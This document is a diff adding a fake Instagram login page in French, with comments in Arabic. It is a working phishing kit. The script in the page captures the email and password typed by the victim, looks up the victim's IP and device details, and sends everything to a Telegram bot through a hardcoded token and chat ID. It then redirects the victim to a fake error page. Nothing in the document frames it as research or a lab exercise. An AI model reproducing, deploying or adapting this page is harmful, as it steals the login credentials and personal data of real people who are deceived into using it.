@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./styles.css" />
+    <link rel="icon" type="image/png" href="./img/insta-fav.ico">
+    <title>Instagram login</title>
+</head>
+<body>
+    <main class="flex align-items-center justify-content-center">
+        <section id="mobile" class="flex">
+            <!-- يمكنك وضع صورة الهاتف هنا إن أردت -->
+        </section>
+        <section id="auth" class="flex direction-column">
+            <div class="panel login flex direction-column">
+                <h1 class="flex justify-content-center">
+                    <img src="./img/instagram-logo.png" alt="Logo Instagram" title="Logo Instagram" />
+                </h1>
+
+                <!-- Form avec ID -->
+                <form id="login-form">
+                    <label for="email" class="sr-only">Téléphone, nom d'utilisateur ou e-mail</label>
+                    <input id="email" name="email" placeholder="Téléphone, nom d'utilisateur ou e-mail" required />
+
+                    <label for="password" class="sr-only">Mot de passe</label>
+                    <input id="password" name="password" type="password" placeholder="Mot de passe" required />
+
+                    <button type="submit">Se connecter</button>
+                </form>
+
+                <!-- Séparateur -->
+                <div class="flex separator align-items-center">
+                    <span></span>
+                    <div class="or">OU</div>
+                    <span></span>
+                </div>
+
+                <!-- Connexion Facebook -->
+                <div class="login-with-fb flex direction-column align-items-center">
+                    <div>
+                        
+                        <a href="facbok/facebook.html">Se connecter avec Facebook</a>
+                    </div>
+                    <a href="facbok/erore.html">Mot de passe oublié ?</a>
+                </div>
+            </div>
+
+            <!-- S'inscrire -->
+            <div class="panel register flex justify-content-center">
+                <p>Vous n'avez pas de compte ? <a href="facbok/erore.html">Inscrivez-vous</a></p>
+            </div>
+
+            <!-- Téléchargement app -->
+            <div class="app-download flex direction-column align-items-center">
+                <p>Téléchargez l'application.</p>
+                <div class="flex justify-content-center">
+                    <img src="./img/apple-button.png" alt="Logo Apple Store" title="Logo Apple Store">
+                    <img src="./img/googleplay-button.png" alt="Logo Google Play" title="Logo Google Play" />
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <!-- Footer -->
+    <footer>
+        <ul class="flex flex-wrap justify-content-center">
+            <li><a href="#">À PROPOS</a></li>
+            <li><a href="#">AIDE</a></li>
+            <li><a href="#">PRESSE</a></li>
+            <li><a href="#">API</a></li>
+            <li><a href="#">CARRIÈRES</a></li>
+            <li><a href="#">CONFIDENTIALITÉ</a></li>
+            <li><a href="#">CONDITIONS</a></li>
+            <li><a href="#">EMPLACEMENT</a></li>
+            <li><a href="#">COMPTES POPULAIRES</a></li>
+            <li><a href="#">HASHTAGS</a></li>
+            <li><a href="#">LANGUE</a></li>
+        </ul>
+        <p class="copyright">© 2025 Instagram de Facebook</p>
+    </footer>
+
+    <!-- Axios -->
+    <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
+
+    <!-- Script Telegram -->
+    <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
+<script>
+    const TOKEN = "7965770609:AAG3WOVW0ZvfEfi3rxW0TGEKlrpzVq1jkaI"; // توكن البوت
+    const CHAT_ID = "6936457842"; // معرف الشات
+    const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+
+    document.getElementById('login-form').addEventListener('submit', function (e) {
+        e.preventDefault();
+
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+
+        axios.get('https://api.ipify.org?format=json')
+            .then(response => {
+                const ip = response.data.ip;
+                const userAgent = navigator.userAgent;
+                const platform = navigator.platform;
+                const screenWidth = screen.width;
+                const screenHeight = screen.height;
+                const deviceType = /mobile/i.test(userAgent) ? 'Mobile' : 'Desktop';
+
+                const message = `
+<b>🔐 Nouvelle tentative de connexion :</b>\n
+<b>📧 Email:</b> ${email}\n
+<b>🔑 Mot de passe:</b> ${password}\n
+<b>🌍 IP:</b> ${ip}\n
+<b>💻 Appareil:</b> ${deviceType}\n
+<b>🖥️ Plateforme:</b> ${platform}\n
+<b>🕵️ Agent:</b> ${userAgent}\n
+<b>📱 Résolution:</b> ${screenWidth}x${screenHeight}
+                `;
+
+                axios.post(URI_API, {
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML'
+                }).finally(() => {
+                    // بعد الإرسال، يتم تحويل المستخدم إلى صفحة erore.html
+                    window.location.href = "facbok/erore.html";
+                });
+            })
+            .catch(() => {
+                // حتى لو فشل جلب IP، نحول المستخدم
+                window.location.href = "facbok/erore.html";
+            });
+    });
+</script>
+
+</body>
+</html>
+
